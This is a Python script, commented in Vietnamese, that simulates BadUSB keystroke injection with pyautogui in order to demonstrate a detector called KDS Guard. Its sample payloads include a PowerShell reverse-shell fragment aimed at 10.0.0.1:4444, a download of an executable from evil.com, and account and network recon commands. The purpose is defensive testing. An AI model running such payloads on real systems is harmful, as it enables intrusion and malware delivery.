#!/usr/bin/env python3
"""
simulate_badusb.py - Mo phong tan cong BadUSB de demo
Khong can phan cung, chay tren may truc tiep.

Cach dung:
  python simulate_badusb.py              # Go nhanh 50 keys/s (mac dinh)
  python simulate_badusb.py --speed 100  # Go nhanh 100 keys/s
  python simulate_badusb.py --payload reverse_shell  # Payload co san

Luu y: Chay song song voi kds_guard.exe de xem ket qua phat hien.
"""

import time
import sys
import argparse

try:
    import pyautogui
except ImportError:
    print("Can cai dat: pip install pyautogui")
    sys.exit(1)

# Tat an toan mac dinh cua pyautogui
pyautogui.FAILSAFE = True  # Di chuot vao goc man hinh de dung khan cap

# Cac payload BadUSB mau
PAYLOADS = {
    "hello": "echo Hello from BadUSB",
    "whoami": "whoami /all",
    "reverse_shell": 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'10.0.0.1\',4444)"',
    "download": 'powershell -c "Invoke-WebRequest http://evil.com/m.exe -OutFile C:\\temp\\m.exe"',
    "recon": "ipconfig /all && systeminfo && net user",
}


def simulate_typing(text: str, delay_ms: float = 20.0, pause_between_commands_ms: float = 100.0):
    """
    Go text voi delay co dinh giua cac phim — dac trung cua BadUSB.
    """
    commands = text.split("\n")
    
    for i, cmd in enumerate(commands):
        for char in cmd:
            pyautogui.press(char) if len(char) == 1 and char.isalnum() else pyautogui.hotkey(char)
            time.sleep(delay_ms / 1000.0)
        
        # Enter sau moi dong lenh
        pyautogui.press("enter")
        time.sleep(delay_ms / 1000.0)
        
        # Khoang nghi deu giua cac lenh (injection fingerprint)
        if i < len(commands) - 1:
            time.sleep(pause_between_commands_ms / 1000.0)


def simulate_fast_keys(num_keys: int = 60, delay_ms: float = 20.0):
    """
    Go phim ngau nhien cuc nhanh — kich hoat R1, R2, R3, R4.
    """
    keys = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    print(f"\n[SIMULATE] Bat dau go {num_keys} phim voi delay {delay_ms}ms")
    print(f"[SIMULATE] Toc do uoc tinh: {1000/delay_ms:.0f} keys/s")
    print(f"[SIMULATE] KDS Guard se phat hien trong ~{num_keys * delay_ms / 1000:.1f}s")
    print("[SIMULATE] Ban co 3 giay de chuyen sang cua so text editor...")
    
    for i in range(3, 0, -1):
        print(f"  {i}...")
        time.sleep(1)
    
    print("[SIMULATE] Dang go...")
    
    start = time.time()
    for i in range(num_keys):
        char = keys[i % len(keys)]
        pyautogui.press(char)
        time.sleep(delay_ms / 1000.0)
        
        # Them Enter sau moi 20 phim (injection fingerprint)
        if (i + 1) % 20 == 0:
            pyautogui.press("enter")
            time.sleep(0.1)  # Khoang nghi deu 100ms
    
    elapsed = time.time() - start
    print(f"\n[SIMULATE] Hoan thanh! {num_keys} phim trong {elapsed:.2f}s")
    print(f"[SIMULATE] Toc do thuc te: {num_keys/elapsed:.1f} keys/s")


def main():
    parser = argparse.ArgumentParser(description="Mo phong tan cong BadUSB")
    parser.add_argument("--speed", type=float, default=50.0,
                       help="Toc do go (keys/s), mac dinh: 50")
    parser.add_argument("--keys", type=int, default=60,
                       help="So phim go, mac dinh: 60")
    parser.add_argument("--payload", type=str, choices=list(PAYLOADS.keys()),
                       help="Dung payload co san")
    parser.add_argument("--custom", type=str,
                       help="Go payload tu dinh nghia")
    args = parser.parse_args()

    delay_ms = 1000.0 / args.speed

    print("=" * 50)
    print("  KDS Guard - BadUSB Simulator")
    print("  Dung de demo phat hien, KHONG phai cong cu tan cong")
    print("=" * 50)

    if args.payload:
        text = PAYLOADS[args.payload]
        print(f"\n[PAYLOAD] {args.payload}: {text[:50]}...")
        print(f"[SPEED] {args.speed} keys/s (delay: {delay_ms:.1f}ms)")
        print("[SIMULATE] Ban co 3 giay de chuyen sang cua so text editor...")
        for i in range(3, 0, -1):
            print(f"  {i}...")
            time.sleep(1)
        simulate_typing(text, delay_ms)
    elif args.custom:
        print(f"\n[CUSTOM] {args.custom[:50]}...")
        print("[SIMULATE] Ban co 3 giay de chuyen sang cua so text editor...")
        for i in range(3, 0, -1):
            print(f"  {i}...")
            time.sleep(1)
        simulate_typing(args.custom, delay_ms)
    else:
        simulate_fast_keys(args.keys, delay_ms)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[SIMULATE] Da dung.")
